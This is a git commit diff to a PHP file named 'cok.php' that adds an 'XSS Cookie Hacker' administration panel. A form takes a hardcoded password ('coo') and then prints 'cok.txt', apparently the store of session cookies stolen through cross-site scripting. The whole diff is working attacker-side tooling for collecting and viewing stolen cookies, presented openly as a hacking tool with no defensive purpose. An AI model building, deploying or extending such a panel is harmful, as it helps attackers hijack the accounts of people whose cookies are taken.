5e8364098b875fd9befcb528b006bf9e185f01cf
Xale <81574241+xaletr@users.noreply.github.com>
2022-03-30 20:01:09 +0300

    Update cok.php

--- cok.php
+++ cok.php
@@ -1,7 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>XSS Cookie Hacker ~ Administration Panel</title>
+	<style>
+.kutu {
+	width: 1900px;
+      height:150px;
+      border: 5px solid white;
+      background-color:black;
+
+  }
+
+.header {
+	color: white;
+	font-family: 'Trebuchet MS', sans-serif;
+
+};
+</style>
+
+</head>
+<body>
+<center>
+
+<div class="kutu">
+	<br>
+	<br>
+<h1 class="header">XSS Cookie Hacker Administration [v2]</h1>
+</div>
+<form method="POST">
+	<input type="text" name="login">
+</form>
+</center>
+</body>
+</html>
 <?php
 error_reporting(0);
-$l = $_GET["login"];
-if ($l == "login") {
+$l = $_POST["login"];
+if ($l == "coo") {
 	echo readFile('cok.txt');
 } else {
 	echo "Coming Soon.";
